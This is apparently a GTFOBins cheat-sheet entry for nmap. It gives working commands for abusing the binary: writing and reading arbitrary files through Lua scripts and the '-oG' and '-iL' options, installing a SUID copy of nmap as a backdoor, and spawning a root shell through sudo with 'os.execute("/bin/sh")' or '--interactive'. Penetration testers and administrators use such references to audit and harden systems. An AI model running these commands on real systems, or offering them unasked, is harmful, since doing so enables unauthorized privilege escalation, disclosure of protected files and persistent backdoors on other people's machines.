# GTFOBin: nmap

## File write

It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.

```
TF=$(mktemp)
echo 'local f=io.open("file_to_write", "wb"); f:write("data"); io.close(f);' > $TF
nmap --script=$TF
```

The payload appears inside the regular nmap output.

```
LFILE=file_to_write
nmap -oG=$LFILE DATA
```

## File read

It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.

```
TF=$(mktemp)
echo 'local f=io.open("file_to_read", "rb"); print(f:read("*a")); io.close(f);' > $TF
nmap --script=$TF
```

The file is actually parsed as a list of hosts/networks, lines are leaked through error messages.

```
nmap -iL file_to_read
```

## SUID

If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.

This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.

The payload appears inside the regular nmap output.

```
sudo install -m =xs $(which nmap) .

LFILE=file_to_write
./nmap -oG=$LFILE DATA
```

## Sudo

If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.

Input echo is disabled.

```
TF=$(mktemp)
echo 'os.execute("/bin/sh")' > $TF
sudo nmap --script=$TF
```

The interactive mode, available on versions 2.02 to 5.21, can be used to execute shell commands.

```
sudo nmap --interactive
nmap> !sh
```

## Limited SUID

If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via `system()`-like invocations) it only works on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.

This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.

Input echo is disabled.

```
sudo install -m =xs $(which nmap) .

TF=$(mktemp)
echo 'os.execute("/bin/sh")' > $TF
./nmap --script=$TF
```